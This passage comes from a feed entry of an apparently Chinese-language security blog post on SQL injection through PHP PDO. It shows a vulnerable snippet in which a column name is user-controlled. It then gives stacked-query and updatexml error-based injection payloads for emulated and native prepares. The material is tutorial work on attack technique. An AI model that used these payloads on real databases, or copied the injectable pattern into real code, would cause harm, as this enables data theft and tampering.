$pdo-&gt;prepare($sql);$stmt-&gt;bindParam(1,$username);$stmt-&gt;execute();while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){var_dump($row);echo &quot;&quot;;}?&gt;   </code></pre><p>可以看到sql语句field字段可控，这样我们构造field，达到多语句执行的效果。</p><p><img src="./../../../../images/02.png" alt></p><p>数据库中语句为：</p><pre><code>select id,username from user;create table sss like user;select id from user where username=Z</code></pre><p>[2]模拟预处理报错注入(PHP&lt;5.3.6)<br>   上述代码，设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); //打印报错信息<br>   同样可以达到报错注入效果<br><img src="./../../../../images/03.png" alt></p><p>在数据库中语句为：</p><pre><code>select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from user where username=Z</code></pre><p>[3]非模拟预处理报错注入<br>   设置pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //表示是否使用PHP本地模拟prepare<br>   ：php对sql语句发送采用了prepare–execute方式，php对sql语句发送采用了prepare–execute方式<br>   此时转义处理交由mysql server来执行，变量和SQL模板是分两次发送的<br>   因此虽然field字段依旧可控，但是多语句不可执行<br>   当设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);时，仍然可以进行报错注入<br><img src="./../../../../images/04.png" alt><br>在数据库中语句为：<br>    select id,updatexml(1,concat(user(),0x7e),1) from user where username=Y;<br>这里可进行报错注入是因为MySQL服务端prepare时报错，然后通过设置PDO::ATTR_ERRMODE将MySQL错误信息打印<br>在MySQL中执行prepare语句<br>    prepare statm from “select id,updatexml(0x7e,concat(0x7e,user(),0x7e),0x7e) from user where username=?”;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP-PDO-amp-Injection-Bypass&quot;&gt;&lt;a href=&quot;#PHP-PDO-amp-Injection-Bypass&quot; class=&quot;headerlink&quot; title=&quot;PHP PDO &amp;amp; Injection Bypass&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
